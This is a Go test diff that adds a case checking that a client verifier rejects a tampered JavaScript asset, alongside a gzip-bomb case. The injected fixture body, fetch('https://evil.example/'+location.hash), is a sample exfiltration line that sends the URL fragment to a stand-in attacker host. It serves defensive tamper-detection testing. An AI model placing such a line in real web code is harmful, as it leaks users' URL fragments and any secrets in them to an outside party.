@@ -311,6 +311,17 @@ func TestVerifyClientRefusesAChangedClient(t *testing.T) {
 			response.body = bytes.Repeat([]byte{'a'}, 2<<20)
 			response.header.Del("Content-Encoding")
 		}), "/terms: client: the server sent a malformed response"},
+		{"unreadable operator contact beside a changed file", func(next http.Handler) http.Handler {
+			contact := rewrite(pathIs(server.TransparencyPath), func(response *served) {
+				response.body = []byte("{")
+				response.header.Del("Content-Encoding")
+			})
+			file := rewrite(pathIs("/assets/index-a1.js"), func(response *served) {
+				response.body = []byte("fetch('https://evil.example/'+location.hash)")
+				response.header.Del("Content-Encoding")
+			})
+			return contact(file(next))
+		}, "/assets/index-a1.js: the file differs"},
 		{"gzip bomb", rewrite(browserAsks("/assets/index-a1.js"), func(response *served) {
 			response.body = gzipBytes(t, bytes.Repeat([]byte{'a'}, 16<<20))
 			response.header.Set("Content-Encoding", "gzip")
